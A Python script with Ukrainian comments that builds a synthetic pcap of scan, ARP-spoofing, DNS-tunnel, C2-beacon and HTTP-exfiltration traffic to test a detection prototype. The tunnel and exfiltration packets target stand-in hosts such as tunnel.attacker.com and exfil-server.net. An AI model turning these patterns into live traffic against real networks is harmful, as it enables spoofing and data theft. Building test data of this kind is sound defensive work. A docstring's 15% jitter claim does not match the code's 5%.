"""Генератор синтетичного pcap з прикладами всіх 5 класів атак.

Створює файл для перевірки коректності роботи прототипу. У звіті за таким
pcap очікуємо високий рівень ризику та спрацювання більшості ключових
детекторів.
"""
import os
import random
import base64
import time

from scapy.all import (
    Ether, IP, TCP, UDP, ICMP, ARP, DNS, DNSQR, DNSRR, Raw,
    wrpcap,
)


def syn_scan_packets(t0):
    """Сценарій 1: SYN-сканування 1000 портів від 192.168.1.50 на 192.168.1.100."""
    pkts = []
    src_ip = "192.168.1.50"
    dst_ip = "192.168.1.100"
    for port in range(1, 1001):
        pkt = (
            Ether() /
            IP(src=src_ip, dst=dst_ip) /
            TCP(sport=random.randint(40000, 60000), dport=port, flags="S",
                seq=random.randint(0, 2**32 - 1))
        )
        pkt.time = t0 + port * 0.01  # 100 пакетів/с
        pkts.append(pkt)
    return pkts


def arp_spoof_packets(t0):
    """Сценарій 2: ARP-spoofing — IP шлюзу прив'язується до 2 MAC."""
    pkts = []
    gateway_ip = "192.168.1.1"
    real_mac = "aa:bb:cc:11:22:33"
    spoof_mac = "de:ad:be:ef:00:01"
    for i in range(30):
        # Чергуємо real та spoof
        mac = spoof_mac if i % 2 == 0 else real_mac
        pkt = (
            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
            ARP(op=2, psrc=gateway_ip, hwsrc=mac,
                pdst="192.168.1.55", hwdst="ff:ff:ff:ff:ff:ff")
        )
        pkt.time = t0 + i * 0.2
        pkts.append(pkt)
    return pkts


def dns_tunnel_packets(t0):
    """Сценарій 3: DNS-тунель (iodine-стиль)."""
    pkts = []
    src_ip = "10.0.5.42"
    dns_server = "8.8.8.8"
    # Кодоване base32 повідомлення з piece-by-piece передачею
    secret = "Привіт, це секретні дані з ураженого хоста, які виводяться через DNS".encode("utf-8")
    chunks = []
    encoded = base64.b32encode(secret).decode().lower().rstrip("=")
    chunk_size = 50
    for i in range(0, len(encoded), chunk_size):
        chunks.append(encoded[i:i + chunk_size])

    # Багато запитів з довгими піддоменами і високою ентропією
    for i in range(50):
        # Симулюємо випадкові імена, типові для DNS-тунелю
        sub = "".join(random.choices(
            "abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(55, 78)
        ))
        qname = f"{sub}.tunnel.attacker.com"
        pkt = (
            Ether() /
            IP(src=src_ip, dst=dns_server) /
            UDP(sport=random.randint(40000, 60000), dport=53) /
            DNS(rd=1, qd=DNSQR(qname=qname, qtype="TXT"))
        )
        pkt.time = t0 + i * 1.5
        pkts.append(pkt)

    return pkts


def beacon_packets(t0):
    """Сценарій 4: C2-біконінг — TLS-сесії кожні 60с з jitter 15%."""
    pkts = []
    src_ip = "10.0.5.77"
    c2_ip = "203.0.113.66"  # цей IP є в IoC!
    base_interval = 60.0
    jitter = 0.05
    ts = t0
    for i in range(40):
        # Регулярний інтервал з невеликим jitter
        interval = base_interval * (1 + random.uniform(-jitter, jitter))
        ts += interval  # кумулятивне накопичення
        # SYN (новий конект)
        syn = (
            Ether() /
            IP(src=src_ip, dst=c2_ip) /
            TCP(sport=random.randint(40000, 60000), dport=443, flags="S",
                seq=random.randint(0, 2**32 - 1))
        )
        syn.time = ts
        pkts.append(syn)
    return pkts


def http_exfil_packets(t0):
    """Сценарій 5: HTTP POST ексфільтрація."""
    pkts = []
    src_ip = "10.0.5.99"
    dst_ip = "198.51.100.42"  # цей теж в IoC!
    # Великий POST-запит
    big_body = b"X" * 80_000_000  # 80 МБ — типовий розмір документного дампа
    payload = b"POST /upload HTTP/1.1\r\nHost: exfil-server.net\r\n\r\n" + big_body
    # Розбиваємо на пакети по 1400 байт
    chunks = [payload[i:i + 1400] for i in range(0, len(payload), 1400)]
    for i, chunk in enumerate(chunks):
        pkt = (
            Ether() /
            IP(src=src_ip, dst=dst_ip) /
            TCP(sport=12345, dport=80,
                flags="A", seq=1000 + i * 1400, ack=1) /
            Raw(load=chunk)
        )
        pkt.time = t0 + i * 0.001
        pkts.append(pkt)
    return pkts


def normal_traffic(t0):
    """Звичайний фоновий трафік — щоб тест був реалістичним."""
    pkts = []
    # Кілька DNS-запитів на нормальні домени
    for i, domain in enumerate(["google.com", "github.com", "ubuntu.com"]):
        pkt = (
            Ether() /
            IP(src="10.0.5.10", dst="8.8.8.8") /
            UDP(sport=50000, dport=53) /
            DNS(rd=1, qd=DNSQR(qname=domain, qtype="A"))
        )
        pkt.time = t0 + i * 5
        pkts.append(pkt)
    # Кілька HTTPS-сесій
    for i in range(10):
        pkt = (
            Ether() /
            IP(src="10.0.5.10", dst=f"203.0.113.{200 + i}") /
            TCP(sport=40000 + i, dport=443, flags="S",
                seq=random.randint(0, 2**32 - 1))
        )
        pkt.time = t0 + i * 30
        pkts.append(pkt)
    return pkts


def main():
    output_path = os.path.join(os.path.dirname(__file__), "test_attacks.pcap")
    t0 = time.time() - 86400  # умовно вчора

    print("[*] Генерую синтетичний тестовий pcap з 5 класами атак...")

    all_pkts = []
    all_pkts.extend(normal_traffic(t0))
    all_pkts.extend(syn_scan_packets(t0 + 100))
    all_pkts.extend(arp_spoof_packets(t0 + 200))
    all_pkts.extend(dns_tunnel_packets(t0 + 300))
    all_pkts.extend(beacon_packets(t0 + 500))
    all_pkts.extend(http_exfil_packets(t0 + 3000))

    # Сортуємо за часом, як у реальному захопленні
    all_pkts.sort(key=lambda p: p.time)

    wrpcap(output_path, all_pkts)
    print(f"[+] Створено: {output_path}")
    print(f"    Загалом пакетів: {len(all_pkts)}")
    print(f"    Розмір: {os.path.getsize(output_path) / 1024:.1f} КБ")


if __name__ == "__main__":
    random.seed(42)
    main()
